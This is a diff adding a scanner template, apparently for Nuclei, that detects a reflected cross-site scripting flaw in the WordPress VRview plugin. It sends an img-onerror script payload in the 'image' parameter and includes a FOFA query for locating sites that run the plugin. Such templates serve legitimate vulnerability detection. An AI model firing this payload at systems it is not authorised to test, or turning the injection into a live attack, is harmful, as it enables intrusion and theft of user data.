@@ -1,0 +1,50 @@
+id: vrview-xss
+
+info:
+  name: VRview Plugin - Cross-Site Scripting
+  author: ritikchaddha
+  severity: high
+  description: |
+    The VRview plugin is a tool commonly used to embed and display 360-degree virtual reality content in web applications. However, improper input sanitization in the plugin allows attackers to inject malicious scripts into trusted websites. This vulnerability, classified as Cross-Site Scripting (XSS), could enable attackers to perform unauthorized actions or steal sensitive user data.
+  reference:
+    - https://blog.mindedsecurity.com/2018/04/dom-based-cross-site-scripting-in.html
+  metadata:
+    max-request: 2
+    fofa-query: body="/wp-content/plugins/vrview/"
+  tags: wp,wp-plugin,wordpress,vrview,xss
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '/wp-content/plugins/vrview'
+        internal: true
+
+  - raw:
+      - |
+        GET /wp-content/plugins/vrview/vrview/?image=<img%20src=x%20onerror=alert(document.domain)> HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<img src=x onerror=alert(document.domain)>'
+
+      - type: word
+        part: content_type
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a0047304502200454f65034e9ae8a6f5efc72820dc7a9bb5383e4b5c7a27929cdadc85f0b8a9a022100d53ea8937f49af8ad88bf509581c126b9fafe8b0b0d0130a4fefb8704da5a76f:922c64590222798bb761d5b6d8e72950
